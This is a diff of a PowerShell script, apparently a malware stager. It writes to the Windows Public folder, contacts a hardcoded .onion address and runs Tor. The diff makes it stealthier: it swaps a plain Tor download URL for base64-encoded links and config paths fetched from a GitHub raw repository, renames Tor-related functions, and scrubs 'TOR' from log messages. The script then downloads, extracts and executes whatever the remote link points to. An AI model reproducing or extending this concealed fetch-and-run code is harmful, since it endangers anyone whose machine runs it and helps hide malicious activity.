@@ -1,29 +1,34 @@
 $log = "C:\Users\Public\log.txt"
 $zip = "C:\Users\Public\link.zip"
 $extract = "C:\Users\Public\extract\"
-$torrcPath = "$extract\Tor\torrc"
 $url = "http://ld52qe2n47otqd63u4jqv26yyev64z2jucgidqisriv7x3fxuoetfjid.onion"
-$link = "https://www.torproject.org/dist/torbrowser/12.5.6/tor-win64-0.4.8.11.zip"
+$orConfigPath = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/aBolondVarazslo/holder/main/config"
+$deConfigPath = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($orConfigPath))
+$tLink = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/aBolondVarazslo/holder/main/link" | Select-Object -ExpandProperty Content
+$oLink = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($tLink))
 
+
+# Downloads from GitHub
 function download {
     if (Test-Path $extract) {
-        "TOR already downloaded. Skipping..." | Out-File -Append -FilePath $log
+        "Already downloaded. Skipping..." | Out-File -Append -FilePath $log
     } else {
-        Invoke-WebRequest -Uri $link -OutFile $zip
+        Invoke-WebRequest -Uri $oLink -OutFile $zip
         Add-Type -AssemblyName System.IO.Compression.FileSystem
         [System.IO.Compression.ZipFile]::ExtractToDirectory($zip, $extract)
         Remove-Item $zip
     }
 }
 
-function writeTorrc {
-    if (!(Test-Path $torrcPath)) {
-        "SOCKSPort 9050" | Out-File -FilePath $torrcPath -Encoding ascii
+# Sets port in config file
+function writeConfig {
+    if (!(Test-Path $deConfigPath)) {
+        "SOCKSPort 9050" | Out-File -FilePath $deConfigPath -Encoding ascii
     }
 }
 
 function startTor {
-    Start-Process -FilePath "$extract\Tor\tor.exe" -ArgumentList "-f $torrcPath" -WindowStyle Normal
+    Start-Process -FilePath "$extract\Tor\tor.exe" -ArgumentList "-f $deConfigPath" -WindowStyle Normal
 }
 
 function waitForTor {
@@ -58,7 +63,7 @@ function main {
 }
 
 download
-writeTorrc
+writeConfig
 startTor
 waitForTor
 
